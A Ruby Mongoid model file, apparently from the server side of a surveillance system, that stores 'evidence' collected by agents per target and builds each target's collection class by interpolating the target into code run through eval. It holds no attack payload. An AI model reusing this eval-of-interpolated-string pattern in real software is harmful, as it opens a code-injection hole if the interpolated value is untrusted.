require 'mongoid'
require_relative '../shard'

#module RCS
#module DB

class Evidence

  def self.collection_name(target)
    "evidence.#{target}"
  end

  def self.collection_class(target)

    classDefinition = <<-END
      class Evidence_#{target}
        include Mongoid::Document

        field :da, type: Integer            # date acquired
        field :dr, type: Integer            # date received
        field :type, type: String
        field :rel, type: Integer           # relevance (tag)
        field :blo, type: Boolean           # blotter (report)
        field :note, type: String
        field :aid, type: String            # agent BSON_ID
        field :data, type: Hash
    
        store_in Evidence.collection_name('#{target}')

        after_create :create_callback
        after_destroy :destroy_callback

        index :type
        index :da
        index :dr
        index :aid
        index :rel
        index :blo
        shard_key :type, :da, :aid

        STAT_EXCLUSION = ['info', 'filesystem']

        protected

        def create_callback
          # skip migrated logs, the stats are calculated by the migration script
          return if (self[:_mid] != nil and self[:_mid] > 0)
          return if STAT_EXCLUSION.include? self.type
          agent = Item.find self.aid
          agent.stat.evidence ||= {}
          agent.stat.evidence[self.type] ||= 0
          agent.stat.evidence[self.type] += 1
          agent.stat.dashboard ||= {}
          agent.stat.dashboard[self.type] ||= 0
          agent.stat.dashboard[self.type] += 1
          agent.stat.size += self.data[:_grid_size] unless self.data[:_grid].nil?
          agent.stat.size += Mongoid.database.collection("#{Evidence.collection_name(target)}").stats()['avgObjSize'].to_i
          agent.stat.grid_size += self.data[:_grid_size] unless self.data[:_grid].nil?
          agent.save
          # update the target of this agent
          agent.get_parent.restat
        end

        def destroy_callback
          return if STAT_EXCLUSION.include? self.type
          agent = Item.find self.aid
          agent.stat.evidence ||= {}
          agent.stat.evidence[self.type] ||= 0
          agent.stat.evidence[self.type] -= 1
          agent.stat.dashboard ||= {}
          agent.stat.dashboard[self.type] ||= 0
          agent.stat.dashboard[self.type] -= 1
          agent.stat.size -= self.data[:_grid_size] unless self.data[:_grid].nil?
          agent.stat.size -= Mongoid.database.collection("#{Evidence.collection_name(target)}").stats()['avgObjSize'].to_i
          agent.stat.grid_size -= self.data[:_grid_size] unless self.data[:_grid].nil?
          agent.save
          
          # drop the file (if any) in grid
          RCS::DB::GridFS.delete(self.data['_grid'], agent.path.last.to_s) unless self.data['_grid'].nil?

          # update the target of this agent
          agent.get_parent.restat
        end
      end
    END
    
    classname = "Evidence_#{target}"
    
    if self.const_defined? classname.to_sym
      klass = eval classname
    else
      eval classDefinition
      klass = eval classname
    end
    
    return klass
  end

  def self.dynamic_new(target_id)
    klass = self.collection_class(target_id)
    return klass.new
  end

  def self.deep_copy(src, dst)
    dst.da = src.da
    dst.dr = src.dr
    dst.blo = src.blo
    dst.data = src.data
    dst.aid = src.aid
    dst.note = src.note
    dst.rel = src.rel
    dst.type = src.type
  end

end

#end # ::DB
#end # ::RCS